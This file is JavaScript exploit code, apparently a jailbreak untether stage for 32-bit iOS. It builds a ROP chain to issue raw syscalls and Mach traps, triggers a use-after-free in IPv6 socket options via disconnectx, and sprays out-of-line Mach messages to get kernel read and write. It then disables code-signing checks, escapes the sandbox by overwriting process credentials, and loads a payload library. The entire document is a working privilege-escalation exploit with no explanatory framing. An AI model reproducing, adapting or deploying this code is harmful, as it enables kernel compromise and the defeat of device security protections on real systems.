
const SYS_exit = 1;
const SYS_write = 4;
const SYS_open = 5;
const SYS_close = 6;
const SYS_fcntl = 92;
const SYS_socket = 97;
const SYS_setsockopt = 105;
const SYS_mmap = 197;
const SYS_getsockopt = 118;
const SYS_disconnectx = 448;
const MACH_TRAP_mach_reply_port = 0xFFFFFFE6;
const MACH_TRAP_task_self = 0xFFFFFFE4;
const MACH_TRAP_host_self = 0xFFFFFFE3;
const MACH_TRAP_mach_msg = 0xFFFFFFE1;
const MACH_TRAP_mach_port_allocate = 0xFFFFFFF0;
const MACH_TRAP_mach_port_destroy = 0xFFFFFFEF;
const MACH_TRAP_mach_port_insert_right = 0xFFFFFFED;

const PROT_READ = 0x01;
const PROT_WRITE = 0x02;
const MAP_FILE = 0x0000;
const MAP_PRIVATE = 0x0002;
const F_ADDSIGS = 59;
const IPPROTO_TCP = 6;
const SOCK_STREAM = 1;
const AF_INET6 = 30;
const SONPX_SETOPTSHUT = 0x000000001;
const SOL_SOCKET = 0xffff;
const SO_NP_EXTENSIONS = 0x1083;
const IPPROTO_IPV6 = 41;
const IPV6_USE_MIN_MTU = 42;
const IPV6_PKTINFO = 46;
const IPV6_PREFER_TEMPADDR = 63;
const O_RDONLY = 0x0000;
const O_RDWR = 0x0002;
const O_CREAT = 0x00000200;
const MACH_PORT_NULL = 0x0;
const MACH_PORT_RIGHT_RECEIVE = 0x1;
const MACH_MSG_TYPE_MAKE_SEND = 0x14;
const MACH_MSG_TYPE_COPY_SEND = 0x13;
const MACH_MSG_OOL_PORTS_DESCRIPTOR = 0x2;
const MACH_MSG_PHYSICAL_COPY = 0x0;
const MACH_SEND_MSG = 0x1;
const OOL_MSG_BITS = 0x80000014;

var util = undefined;
var sys = undefined;

var offsets = {
    mach_msg_hdr: {
        msgh_bits: 0x0,
        msgh_size: 0x4,
        msgh_remote_port: 0x8,
        msgh_local_port: 0xc,
        msgh_voucher_port: 0x10,
        msgh_id: 0x14
    },
    mach_msg_body: {
        msgh_descriptor_count: 0x18
    },
    ool_msg: {
        size: 0x28,
        ool_ports: {
            address: 0x1c,
            count: 0x20,
            deallocate: 0x24,
            copy: 0x25,
            disposition: 0x26,
            type: 0x27
        }
    },
    task: {
        bsd_info: 0x200
    },
    ipc_port: {
        ip_kobject: 0x50
    },
}

var Util = function() {
    this.u32_f64_buf = new ArrayBuffer(0x8);
    this.u32_array = new Uint32Array(this.u32_f64_buf);
    this.f64_array = new Float64Array(this.u32_f64_buf);
    this.output_buf = new ArrayBuffer(0x20);
    this.output = new DataView(this.output_buf);
    this.output_addr = undefined;
    this.rop_data = undefined;

    this.dsc_convert_addr = function(addr) {
        return (addr - 0x20000000) + info.remap_base;
    }

    this.f64_to_u32 = function(value) {
        this.f64_array[0] = value;
        return [this.u32_array[0], this.u32_array[1]];
    }

    this.u32_to_f64 = function(hi, lo) {
        this.u32_array[0] = hi;
        this.u32_array[1] = lo;
        return this.f64_array[0];
    }

    this.hex32 = function(num) {
        num = num >>> 0;
        var hex_str = num.toString(16);
        while (hex_str.length < 8) {
            hex_str = '0' + hex_str;
        }
        return '0x' + hex_str;
    }

    this.hex64 = function(num) {
        num = num >>> 0;
        var hex_str = num.toString(16);
        while (hex_str.length < 16) {
            hex_str = '0' + hex_str;
        }
        return '0x' + hex_str;
    }

    this.read32 = function(addr) {
        return dv_rw.getUint32(addr, true);
    }

    this.write32 = function(addr, value) {
        dv_rw.setUint32(addr, value, true);
    }

    this.write8 = function(addr, value) {
        dv_rw.setUint8(addr, value);
    }

    this.addrof = function(object) {
        arr_addrof[0] = object;
        return dv_addrof.getUint32(0, true);
    }

    this.str_addr = function(str) {
        var size = str.length;
        var buf = new ArrayBuffer(size + 0x8);
        var dv = new DataView(buf);
        for (var i = 0; i < size; i++) {
            dv.setUint8(i, str.charCodeAt(i) & 0xFF);
        }

        var dv_addr = this.addrof(dv);
        return this.read32(dv_addr + 0x10);
    }

    this.create_data_buf = function(size) {
        var info = {};
        info.array_buf = new ArrayBuffer(size + 0x8);
        info.data = new DataView(info.array_buf);
        info.size = size;
        info.addr = this.read32(this.addrof(info.data) + 0x10);

        info.read = function(offset, size) {
            switch (size) {
                case 1: return this.data.getUint8(offset);
                case 2: return this.data.getUint16(offset, true);
                case 4: return this.data.getUint32(offset, true);
                default: return 0;
            }
        }

        info.write = function(offset, value, size) {
            switch (size) {
                case 1: this.data.setUint8(offset, value & 0xff); break;
                case 2: this.data.setUint16(offset, value & 0xffff, true); break;
                case 4: this.data.setUint32(offset, value & 0xffffffff, true); break;
                default: break;
            }
        }
        return info;
    }

    this.syscall = function() {
        if (this.rop_data == undefined) {
            this.rop_data = this.create_data_buf(0x1000);
   
            if (info.syscall_version == 1) {
                this.rop_data.write(0x0, 0x00000000, 0x4); // r0 (clobber)
                this.rop_data.write(0x4, 0x00000000, 0x4); // r1 (clobber)
                this.rop_data.write(0x8, 0x00000000, 0x4); // r2 (clobber)
                this.rop_data.write(0xc, 0x00000000, 0x4); // sb (clobber)
                this.rop_data.write(0x10, this.rop_data.addr + 0x18, 0x4); // ip (part2)
                this.rop_data.write(0x14, info.syscall_gadget2, 0x4); // pc

                this.rop_data.write(0x18, 0x00000000, 0x4); // r0 (arg1)
                this.rop_data.write(0x1c, 0x00000000, 0x4); // r1 (arg2)
                this.rop_data.write(0x20, 0x00000000, 0x4); // r2 (arg3)
                this.rop_data.write(0x24, 0x00000000, 0x4); // r3 (arg4)
                this.rop_data.write(0x28, 0x00000000, 0x4); // r4 (arg5)
                this.rop_data.write(0x2c, this.rop_data.addr + 0x800, 0x4); // sb (return value ptr)
                this.rop_data.write(0x30, this.rop_data.addr + 0x40, 0x4); // sl (part3)
                this.rop_data.write(0x34, 0x00000000, 0x4); // fp (clobber)
                this.rop_data.write(0x38, 0x00000000, 0x4); // ip (clobber)
                this.rop_data.write(0x3c, info.syscall_gadget3, 0x4); // pc

                this.rop_data.write(0x40, 0x00000000, 0x4); // r5 (arg6) / r4 (clobber)
                this.rop_data.write(0x44, 0x00000000, 0x4); // r6 (arg7) / r6 (clobber)
                this.rop_data.write(0x48, info.syscall_gadget5, 0x4); // r8 (clobber) / pc
                this.rop_data.write(0x4c, 0x41414141, 0x4); // ip (syscall number)
                this.rop_data.write(0x50, info.syscall_gadget4, 0x4); // pc
            } else {
                this.rop_data.write(0x0, 0x00000000, 0x4); // r0 (clobber)
                this.rop_data.write(0x4, 0x00000000, 0x4); // r1 (clobber)
                this.rop_data.write(0x8, 0x00000000, 0x4); // r2 (clobber)
                this.rop_data.write(0xc, 0x00000000, 0x4); // sb (clobber)
                this.rop_data.write(0x10, this.rop_data.addr + 0x18, 0x4); // ip (part2)
                this.rop_data.write(0x14, info.syscall_gadget2, 0x4); // pc

                this.rop_data.write(0x18, 0x00000000, 0x4); // r0 (arg1)
                this.rop_data.write(0x1c, 0x00000000, 0x4); // r1 (arg2)
                this.rop_data.write(0x20, 0x00000000, 0x4); // r2 (clobber)
                this.rop_data.write(0x24, 0x00000000, 0x4); // r3 (clobber)
                this.rop_data.write(0x28, 0x00000000, 0x4); // r4 (arg5)
                this.rop_data.write(0x2c, this.rop_data.addr + 0x800, 0x4); // sb (return value ptr)
                this.rop_data.write(0x30, this.rop_data.addr + 0x58, 0x4); // sl (part4)
                this.rop_data.write(0x34, this.rop_data.addr + 0x40, 0x4); // fp (part3)
                this.rop_data.write(0x38, 0x00000000, 0x4); // ip (clobber)
                this.rop_data.write(0x3c, info.syscall_gadget3, 0x4); // pc

                this.rop_data.write(0x40, 0x00000000, 0x4); // r2 (arg3)
                this.rop_data.write(0x44, 0x00000000, 0x4); // r3 (arg4)
                this.rop_data.write(0x48, 0x00000000, 0x4); // r5 (arg6)
                this.rop_data.write(0x4c, 0x00000000, 0x4); // r6 (arg7)
                this.rop_data.write(0x50, 0x41414141, 0x4); // ip (syscall number)
                this.rop_data.write(0x54, info.syscall_gadget4, 0x4); // pc

                this.rop_data.write(0x58, 0x00000000, 0x4); // r1 (clobber)
                this.rop_data.write(0x5c, 0x00000000, 0x4); // r3 (clobber)
                this.rop_data.write(0x60, 0x00000000, 0x4); // r4 (clobber)
                this.rop_data.write(0x64, 0x00000000, 0x4); // r8 (clobber)
                this.rop_data.write(0x68, info.syscall_orig_lr, 0x4); // lr (hardcoded to orig)
                this.rop_data.write(0x6c, info.syscall_gadget5, 0x4); // pc
            }
        };

        var args = Array(8).fill(0);
        var syscall_num = arguments[0];
        for (var i = 0; i < arguments.length-1; i++) {
            args[i] = arguments[i+1];
        }

        if (info.syscall_version == 1) {
            this.rop_data.write(0x18, args[0], 0x4); // r0 (arg1)
            this.rop_data.write(0x1c, args[1], 0x4); // r1 (arg2)
            this.rop_data.write(0x20, args[2], 0x4); // r2 (arg3)
            this.rop_data.write(0x24, args[3], 0x4); // r3 (arg4)
            this.rop_data.write(0x28, args[4], 0x4); // r4 (arg5)
            this.rop_data.write(0x40, args[5], 0x4); // r5 (arg6)
            this.rop_data.write(0x44, args[6], 0x4); // r6 (arg7)
            this.rop_data.write(0x4c, syscall_num, 0x4); // ip (syscall number)
            this.rop_data.write(0x800, 0x00000000, 0x4); // return value
        } else {
            this.rop_data.write(0x18, args[0], 0x4); // r0 (arg1)
            this.rop_data.write(0x1c, args[1], 0x4); // r1 (arg2)
            this.rop_data.write(0x40, args[2], 0x4); // r2 (arg3)
            this.rop_data.write(0x44, args[3], 0x4); // r3 (arg4)
            this.rop_data.write(0x28, args[4], 0x4); // r4 (arg5)
            this.rop_data.write(0x48, args[5], 0x4); // r5 (arg6)
            this.rop_data.write(0x4c, args[6], 0x4); // r6 (arg7)
            this.rop_data.write(0x50, syscall_num, 0x4); // ip (syscall number)
            this.rop_data.write(0x800, 0x00000000, 0x4); // return value
        }
 
        var call_value = this.u32_to_f64(0x13371337, this.rop_data.addr);
        syscall_helper(call_value);
        return this.rop_data.read(0x800, 0x4);    
    }

    this.dlopen = function(path, mode) {
        var data = this.create_data_buf(0x1000);
        data.write(0x0, 0x00000000, 0x4); // r0 (clobber)
        data.write(0x4, 0x00000000, 0x4); // r1 (clobber)
        data.write(0x8, 0x00000000, 0x4); // r2 (clobber)
        data.write(0xc, 0x00000000, 0x4); // sb (clobber)
        data.write(0x10, data.addr + 0x18, 0x4); // ip (part2)
        data.write(0x14, info.syscall_gadget2, 0x4); // pc

        data.write(0x18, this.str_addr(path), 0x4); // r0 (arg1)
        data.write(0x1c, mode, 0x4); // r1 (arg2)
        data.write(0x20, 0x00000000, 0x4); // r2 (clobber)
        data.write(0x24, 0x00000000, 0x4); // r3 (clobber)
        data.write(0x28, 0x00000000, 0x4); // r4 (clobber)
        data.write(0x2c, 0x00000000, 0x4); // sb (clobber)
        data.write(0x30, 0x00000000, 0x4); // sl (clobber)
        data.write(0x34, 0x00000000, 0x4); // fp (clobber)
        data.write(0x38, 0x00000000, 0x4); // ip (clobber)
        data.write(0x3c, info.dlopen_addr, 0x4); // pc
        
        var call_value = this.u32_to_f64(0x13371337, data.addr);
        syscall_helper(call_value);
    }

    this.print = function(str) {
        sys.write(2, this.str_addr(str), str.length);
    }

    this.init = function() {
        this.output_addr = this.read32(this.addrof(this.output) + 0x10);
        info.dsc_slide = this.read32(0x12000200);
        info.dlopen_addr = info.dlopen_addr + info.dsc_slide;
        info.syscall_orig_lr = info.syscall_orig_lr + info.dsc_slide;
    }
}

var System = function() {
    this.__mach_task_self = undefined;
    this.__mach_host_self = undefined;
    this.__mach_reply_port = undefined;

    this.mach_task_self = function() {
        if (this.__mach_task_self == undefined) {
            this.__mach_task_self = util.syscall(MACH_TRAP_task_self);
        }
        return this.__mach_task_self;
    }

    this.mach_host_self = function() {
        if (this.__mach_host_self == undefined) {
            this.__mach_host_self = util.syscall(MACH_TRAP_host_self);
        }
        return this.__mach_host_self;
    }

    this.mach_reply_port = function() {
        if (this.__mach_reply_port == undefined) {
            this.__mach_reply_port = util.syscall(MACH_TRAP_mach_reply_port);
        }
        return this.__mach_reply_port;
    }

    this.exit = function(code) {
        return util.syscall(SYS_exit, code);
    }

    this.write = function(fd, data, size) {
        return util.syscall(SYS_write, fd, data, size);
    }

    this.open = function(path, mode) {
        var path_addr = util.str_addr(path);
        return util.syscall(SYS_open, path_addr, mode);
    }

    this.fcntl = function(fd, opt, addr) {
        return util.syscall(SYS_fcntl, fd, opt, addr);
    }

    this.close = function(fd) {
        return util.syscall(SYS_close, fd);
    }

    this.mmap = function(addr, size, prot, flags, fd, offset) {
        return util.syscall(SYS_mmap, addr, size, prot, flags, fd, offset);
    }

    this.setsockopt = function(fd, level, name, val_addr, val_size) {
        return util.syscall(SYS_setsockopt, fd, level, name, val_addr, val_size);
    }

    this.getsockopt = function(fd, level, name, val_addr, val_size) {
        return util.syscall(SYS_getsockopt, fd, level, name, val_addr, val_size);
    }

    this.socket = function(domain, type, protocol) {
        return util.syscall(SYS_socket, domain, type, protocol);
    }

    this.disconnectx = function(fd, aid, cid) {
        return util.syscall(SYS_disconnectx, fd, aid, cid);
    }

    this.mach_port_allocate = function(task, right, port_addr) {
        return util.syscall(MACH_TRAP_mach_port_allocate, task, right, port_addr);
    }

    this.mach_port_destroy = function(task, port) {
        return util.syscall(MACH_TRAP_mach_port_destroy, task, port);
    }

    this.mach_port_insert_right = function(task, name, port, right) {
        return util.syscall(MACH_TRAP_mach_port_insert_right, task, name, port, right);
    }

    this.mach_msg = function(hdr_addr, opt, send_size, recv_size, recv_name, timeout, notify) {
        return util.syscall(MACH_TRAP_mach_msg, hdr_addr, opt, send_size, recv_size, recv_name, timeout, notify);
    }
}

function create_socket() {
    var fd = sys.socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    util.output.setUint32(0x0, SONPX_SETOPTSHUT, true);
    util.output.setUint32(0x4, SONPX_SETOPTSHUT, true);

    var sonpx_addr = util.output_addr;
    sys.setsockopt(fd, SOL_SOCKET, SO_NP_EXTENSIONS, sonpx_addr, 0x8);
    return fd;
}

function set_min_mtu(fd, value) {
    util.output.setUint32(0x0, value, true);
    var minmtu_addr = util.output_addr;
    sys.setsockopt(fd, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu_addr, 0x4);
}

function get_min_mtu(fd) {
    util.output.setUint32(0x0, 0, true);
    util.output.setUint32(0x4, 4, true);
    var minmtu_addr = util.output_addr;
    var size_addr = util.output_addr + 0x4;
    sys.getsockopt(fd, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu_addr, size_addr);
    return util.output.getUint32(0x0, true);
}

function get_pkt_info(fd, pktinfo_addr) {
    util.output.setUint32(0x0, 20, true);
    var size_addr = util.output_addr;
    sys.getsockopt(fd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, size_addr);
}

function set_pkt_info(fd, pktinfo_addr) {
    sys.setsockopt(fd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 20);
}

function get_temp_addr(fd) {
    util.output.setUint32(0x0, 0, true);
    util.output.setUint32(0x4, 4, true);
    var prefertemp_addr = util.output_addr;
    var size_addr = util.output_addr + 0x4;
    sys.getsockopt(fd, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertemp_addr, size_addr);
    return util.output.getUint32(0x0, true);
}

function create_uaf_socket() {
    var socket_fd = create_socket();
    set_min_mtu(socket_fd, 0);
    sys.disconnectx(socket_fd, 0, 0);
    return socket_fd;
}

function create_mach_port(make_send) {
    util.output.setUint32(0x0, 0, true);
    var port_addr = util.output_addr;

    sys.mach_port_allocate(sys.mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port_addr);
    var port = util.output.getUint32(0x0, true);

    if (make_send) {
        sys.mach_port_insert_right(sys.mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    }
    return port;
}

function ool_msg_data_spray(data_addr, size) {
    var remote = create_mach_port(false);
    var msg = util.create_data_buf(offsets.ool_msg.size);
    msg.write(offsets.mach_msg_hdr.msgh_bits, OOL_MSG_BITS, 0x4);
    msg.write(offsets.mach_msg_hdr.msgh_size, offsets.ool_msg.size, 0x4);
    msg.write(offsets.mach_msg_hdr.msgh_remote_port, remote, 0x4);
    msg.write(offsets.mach_msg_hdr.msgh_local_port, MACH_PORT_NULL, 0x4);
    msg.write(offsets.mach_msg_hdr.msgh_id, 0x41414141, 0x4);

    msg.write(offsets.mach_msg_body.msgh_descriptor_count, 1, 0x4);

    msg.write(offsets.ool_msg.ool_ports.address, data_addr, 0x4);
    msg.write(offsets.ool_msg.ool_ports.count, size/4, 0x4);
    msg.write(offsets.ool_msg.ool_ports.deallocate, 0, 0x1);
    msg.write(offsets.ool_msg.ool_ports.disposition, MACH_MSG_TYPE_COPY_SEND, 0x1);
    msg.write(offsets.ool_msg.ool_ports.type, MACH_MSG_OOL_PORTS_DESCRIPTOR, 0x1);
    msg.write(offsets.ool_msg.ool_ports.copy, MACH_MSG_PHYSICAL_COPY, 0x1);

    sys.mach_msg(msg.addr, MACH_SEND_MSG, offsets.ool_msg.size, 0, 0, 0, 0);
    return remote;
}

function ool_msg_port_spray(target_port, count) {
    var port_list = util.create_data_buf(count * 0x4);
    for (var i = 0; i < count; i++) {
        port_list.data.setUint32(i*0x4, target_port, true);
    }
    return ool_msg_data_spray(port_list.addr, port_list.size);    
}

function get_ipc_port_addr(port) {
    for (var i = 0; i < 50; i++) {
        for (var j = 0; j < 50; j++) {
            var socket_fd = create_uaf_socket();
            if (socket_fd < 0) continue;

            var remote = ool_msg_port_spray(port, 192/4);
            if (remote == MACH_PORT_NULL) {
                sys.close(socket_fd);
                continue;
            }

            var mtu = get_min_mtu(socket_fd);
            var temp_addr = get_temp_addr(socket_fd);

            if (mtu != 0xffffffff && mtu != 0 && temp_addr != 0xdeadbeef && mtu == temp_addr) {
                sys.mach_port_destroy(sys.mach_task_self(), remote);
                sys.close(socket_fd);
                return mtu;
            }

            sys.mach_port_destroy(sys.mach_task_self(), remote);
            sys.close(socket_fd);
        }
    }
    return 0;
}

function primitive(addr, overwrite, data_addr) {
    var fake_opts = util.create_data_buf(192);
    fake_opts.write(8, addr, 0x4);
    fake_opts.write(12, addr, 0x4);
    fake_opts.write(116, addr, 0x4);
    fake_opts.write(120, 0x13374141, 0x4);

    for (var i = 0; i < 50; i++) {
        for (var j = 0; j < 50; j++) {
            var socket_fd = create_uaf_socket();
            if (socket_fd < 0) continue;

            var remote = ool_msg_data_spray(fake_opts.addr, fake_opts.size);
            if (remote == MACH_PORT_NULL) {
                sys.close(socket_fd);
                continue;
            }

            var mtu = get_min_mtu(socket_fd);
            if (mtu == 0x13374141) {
                if (overwrite) {
                    set_pkt_info(socket_fd, data_addr);
                } else {
                    get_pkt_info(socket_fd, data_addr);
                }

                sys.mach_port_destroy(sys.mach_task_self(), remote);
                sys.close(socket_fd);
                return 0;
            }

            sys.mach_port_destroy(sys.mach_task_self(), remote);
            sys.close(socket_fd);
        }
    }
    return -1;
}

function kread32(addr) {
    var pktinfo = util.create_data_buf(20);
    if (primitive(addr, false, pktinfo.addr) != 0) return 0;
    return pktinfo.read(0x0, 4);
}

function bypass_codesigning() {
    var libdispatch_fd = sys.open("/mnt1/usr/lib/system/introspection/libdispatch.dylib", O_RDONLY);
    var libdispatch_data = sys.mmap(0, info.libdispatch_file_size, PROT_READ|PROT_WRITE, MAP_FILE | MAP_PRIVATE, libdispatch_fd, 0);

    var signature = util.create_data_buf(0x2c);
    signature.write(0x0, 0, 0x4);
    signature.write(0x8, libdispatch_data + info.libdispatch_csblob_offset, 0x4);
    signature.write(0xc, info.libdispatch_csblob_size, 0x4);

    var untether_fd = sys.open("/mnt1/usr/lib/iocaste.dylib", O_RDONLY);
    sys.fcntl(untether_fd, F_ADDSIGS, signature.addr);

    var pktinfo = util.create_data_buf(20);
    pktinfo.write(0x0, 0, 0x4);
    pktinfo.write(0x4, 0, 0x4);
    pktinfo.write(0x8, 0, 0x4);
    pktinfo.write(0xc, 0, 0x4);
    pktinfo.write(0x10, 0x2, 0x4);

    primitive(info.self_proc_addr + 0x1c8, true, pktinfo.addr);
    signature = 0;
    pktinfo = 0;
}

function bypass_sandbox() {
    var self_ucred = kread32(info.self_proc_addr + 0xa4);
    var cr_gmuid_ptr = self_ucred + 0x64;

    var orig_data = util.create_data_buf(20);
    primitive(cr_gmuid_ptr, false, orig_data.addr);

    var handoff_addr = 0x12000000;
    util.write32(handoff_addr + 0x0, cr_gmuid_ptr);
    util.write32(handoff_addr + 0x4, orig_data.read(0x0, 0x4));
    util.write32(handoff_addr + 0x8, orig_data.read(0x4, 0x4));
    util.write32(handoff_addr + 0xc, orig_data.read(0x8, 0x4));
    util.write32(handoff_addr + 0x10, orig_data.read(0xc, 0x4));
    util.write32(handoff_addr + 0x14, orig_data.read(0x10, 0x4));
    
    var pktinfo = util.create_data_buf(20);
    pktinfo.write(0x0, 0, 0x4);
    pktinfo.write(0x4, 0, 0x4);
    pktinfo.write(0x8, 0, 0x4);
    pktinfo.write(0xc, 0, 0x4);
    pktinfo.write(0x10, 0x2, 0x4);

    primitive(cr_gmuid_ptr, true, pktinfo.addr);
    pktinfo = 0;
}

function main() {
    util = new Util();
    sys = new System();
    util.init();

    info.self_port_addr = get_ipc_port_addr(sys.mach_task_self());
    info.self_task_addr = kread32(info.self_port_addr + offsets.ipc_port.ip_kobject);
    info.self_proc_addr = kread32(info.self_task_addr + offsets.task.bsd_info);

    bypass_codesigning();
    bypass_sandbox();

    util.dlopen("/mnt1/usr/lib/iocaste.dylib", 0x2);
    util.write32(0xff4141ff, 0x41414141);
    sys.exit(21);
}

main();
